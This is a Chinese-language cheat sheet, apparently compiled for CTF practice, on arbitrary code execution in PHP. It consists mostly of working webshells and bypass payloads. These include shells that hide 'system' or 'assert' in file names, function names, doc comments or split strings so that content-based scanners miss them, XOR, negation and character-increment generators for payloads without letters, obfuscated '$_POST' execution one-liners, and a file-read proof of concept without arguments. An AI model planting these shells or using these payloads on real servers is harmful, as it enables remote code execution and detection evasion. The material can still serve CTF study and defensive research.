# PHP 任意代码执行(ACE)相关

利用字符串函数名执行特性 

## **变量覆盖**

```php
<?php
$b='ls';
parse_str("a=$b");
print_r(`$a`); 
?>
```

### **析构函数**

```php
<?php
	class User {
		public $name="";
		function __destruct (){
			eval($this->name);
		}	
	}
	highlight_file(__FILE__);

	$user = new User;
	$user->name = $_GET['l1nk'];
?>
```

### 利用文件名

一般webshell是通过文件内容来查杀，因此我们可以利用一切非文件内容的可控值来构造webshell，譬如文件名

```php
<?php
substr(__FILE__, -10,-4)($_GET['a']);
?>
```

同理，除了文件名，还有哪些我们很容易可以控制的值呢？

函数名也可。

```php
<?php 
function systema(){
    substr(__FUNCTION__, -7,-1)($_GET['a']);
}
systema();
```

同理方法名也可

```php
<?php 
class test{
    function systema(){
        substr(__METHOD__, -7,-1)($_GET['a']);
    }
}
$a = new test();
$a->systema();
```

还有类名 `__CLASS__` 什么的就不再多说了。

### 利用注释

`PHP Reflection API` 可以用于导出或者提取关于类 , 方法 , 属性 , 参数 等详细信息 . 甚至包含注释的内容。

```php
<?php
/**
*system
*/
highlight_file(__FILE__);
class TestClass {}

$rc = new ReflectionClass('TestClass');
#echo $rc->getDocComment();
echo substr($rc->getDocComment(),-9,-3)($_GET['l1nk']);
?>
```

## ByPass

### 异或

```python
payload="phpinfo"
allowed="ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz}~!#%*+-/:;<=>?@"# no ()
reth=""
rett=""
for c in payload:
    flag=False
    for i in allowed:
        if flag == False:
            for j in allowed:
                if ord(i)^ord(j)==ord(c):
                    #print("i=%s j=%s c=%s"%(i,j,c))
                    reth=reth+"%"+str(hex(ord(i)))[2:]
                    rett=rett+"%"+str(hex(ord(j)))[2:]
                    flag=True
                    break
ret=reth+"^"+rett

print ret
```

#### 白名单异或

```php
$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
$convert = ['decbin','decoct'];
foreach($whitelist as $a){
    foreach($convert as $b){
        for($i=0;$i<999999;$i++){
            $result = $a ^ $b($i);
            if(preg_match('/_GET|_POST|_REQUEST/',$result)){
                echo $a."^".$b."(".$i.")=".$result."\n";
            }
        }
    }
}
```

#### 异或shell



### 取反

```php
<?php
$str = 'phpinfo';
$str = str_split($str);
$flag='';
foreach ($str as  $value) {
    $flag.=~$value;
}
echo "(~".urlencode($flag).")();";
```

### 字符自增

```php
<?=[$_=[],
$_=@"$_",
$_=$_['!'=='@'],
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___=$__, 
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,
$__=$_,
$__++,$__++,$__++,$__++,
$___.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,
$____='_',
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$_=$$____,
$___($_["_"])]?> //"assert"($_POST["_"])
```

```php
<?=[$_=[],
$_=@"$_",
$_=$_['!'=='@'],
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___=$__,//P

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,//H

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,//P

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,//I

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,//N

$__=$_,
$__++,$__++,$__++,$__++,$__++,
$___.=$__,//F

$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$___.=$__,//O


$___()]?>
```

```php
<?=[$_=[],
$_=@"$_",
$_=$_['!'=='@'],
$____='_',
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$__=$_,
$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,$__++,
$____.=$__,
$_=$$____,
$_["__"]($_["_"])]?>//$_POST["__"]($_POST["_"])
```

还可以用 ``<?=?> 替代分号逗号

```php
$_=[].[];#$_='ArrayArray'
$_=''.[];#$_='Array'
```

```php
<?php $_=[].[];$__=0;$__++;$__++;$__++;$_=$_[$__]; #$_='a'
<?php $_=''.[];$__=0;$__++;$__++;$__++;$_=$_[$__]; #$_='a'
```

### “数字”拼接

>  PHP 中，将两个数字使用.拼接，会当做字符串来处理，返回的也是一个字符串。例如：(1).(2)出来的就是字符串"12"，然后可以用{}来代替[]来取单个字符。


```php
$char = '1234567890-INFAH@+*%$()"!%meogiakcfhvwbnq_';
for($i = 0; $i < strlen($char); $i++){
    for($j = 0; $j < strlen($char); $j++){
        echo($char[$i] .'&' .$char[$j] . ' '. ($char[$i] & $char[$j]));
        echo("<br>");
        echo($char[$i] .'|' .$char[$j] . ' '. ($char[$i] | $char[$j]));
        echo("<br>");
    }
}
```

sissel师傅写的脚本

```php
<?php
$old_list = 'INFA0123456789';
$new_list = $old_list;

$result = array(
    "I"=>"((1/0).(0)){0}",
    "N"=>"((1/0).(0)){1}",
    "F"=>"((1/0).(0)){2}",
    "A"=>"((0/0).(0)){1}",
    "0"=>"((0).(0)){0}",
    "1"=>"((1).(0)){0}",
    "2"=>"((2).(0)){0}",
    "3"=>"((3).(0)){0}",
    "4"=>"((4).(0)){0}",
    "5"=>"((5).(0)){0}",
    "6"=>"((6).(0)){0}",
    "7"=>"((7).(0)){0}",
    "8"=>"((8).(0)){0}",
    "9"=>"((9).(0)){0}",
);

while(true){
    for($i = 0; $i < strlen($old_list); $i++){
        for($j = 0; $j < strlen($old_list); $j++){
            $tmp = ($old_list[$i]) & ($old_list[$j]);
            if(! isset($result[$tmp])){
                $result[$tmp] = "(".$result[$old_list[$i]].")&(".$result[$old_list[$j]].")";
                $new_list .= $tmp;
            } 

            $tmp = $old_list[$i] | $old_list[$j];
            if(! isset($result[$tmp])){
                $result[$tmp] = "(".$result[$old_list[$i]].")|(".$result[$old_list[$j]].")";
                $new_list .= $tmp;
            } 
        }
    }

    if($new_list == $old_list)
        break;
    $old_list = $new_list;
}
//var_dump($result);
//var_dump($old_list);

function gen($op){
    global $result;
    $final = array();
    for($i = 0; $i < strlen($op); $i++){
        if(!array_key_exists($op[$i],$result)){
            $final[]=("(".$result[strtoupper($op[$i])].")");
        }
        else $final[]=("(".$result[$op[$i]].")");
    }
    //var_dump($final);
    return "(".implode(".",$final).")";
}

$payload = gen("phpinfo").gen("").";";

echo $payload;

eval($payload);
```

有些字符可能无法利用``&|``生成，可利用php忽略大小写的特性绕过

### 无参数读文件

过滤条件
```php
preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])
';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['exp'])
```

利用``current(localeconv()) pos(localeconv()) === .``

POC:

```php
show_source(array_rand(array_flip(scandir(current(localeconv()))))); #随机当前读目录下文件
chdir(next(scandir(pos(localeconv()) #chdir(next(scandir(pos(localeconv()
```

```
echo(readfile(end(scandir())))))));
```

#### 参考资料

RoarCTF Web writeup https://github.red/roarctf-web-writeup/


## 

```php
<?php
error_reporting(0);
function argu($a, $b){
    $ext = explode('ABKing',$a);
    $ext1 = $ext[0];
    $ext2 = $ext[1];
    $ext3 = $ext[2];
    $ext4 = $ext[3];
    $ext5 = $ext[4];
    $ext6 = $ext[5];
    $arr[0] = $ext1.$ext2.$ext3.$ext4.$ext5.$ext6;
    $arr[1] = $b;
    return $arr;
}
$b = $_POST['x'];
$arr = argu("aABKingsABKingsABKingeABKingrABKingt", $b);
$x = $arr[0];
$y = $arr[1];
array_map($x, array($y));
?>
```